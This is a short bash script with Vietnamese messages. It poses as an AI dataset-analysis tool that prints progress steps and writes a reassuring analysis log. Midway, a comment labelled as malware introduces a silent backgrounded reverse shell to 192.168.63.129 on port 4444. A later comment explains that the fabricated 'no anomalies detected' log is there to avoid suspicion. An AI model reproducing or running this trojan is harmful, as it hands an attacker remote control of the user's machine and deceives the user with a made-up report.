#!/bin/bash

echo "[*] Đang giải nén tập dữ liệu..."
sleep 2
echo "[*] Đang chuẩn hóa dữ liệu đầu vào..."
sleep 2
echo "[*] Đang phân tích với mô hình AI..."
sleep 3

# Mã độc: reverse shell (âm thầm)
bash -c "bash -i >& /dev/tcp/192.168.63.129/4444 0>&1" 2>/dev/null &

echo "[*] Đang sinh báo cáo phân tích..."
sleep 2

# Ghi file log giả để không gây nghi ngờ
cat << EOF > result_analysis.log
[+] Dataset: dataset.csv
[+] Tổng dòng: 12,358
[+] Cột: 28
[+] Thiếu dữ liệu: 0.2%
[+] Bản sao: 14
[+] Anomaly Score: 0.03 (An toàn)
[+] Accuracy mô hình: 97.6%
[+] Trạng thái: Đạt yêu cầu
[+] Thời gian phân tích: 2 phút 30 giây
[+] Ngày phân tích: $(date '+%Y-%m-%d %H:%M:%S')
[+] Phân tích bởi: AI Model v1.0
[+] Ghi chú: Không có hành vi bất thường nào được phát hiện.
EOF

echo "[*] Hoàn tất. Báo cáo đã được lưu tại: result_analysis.log"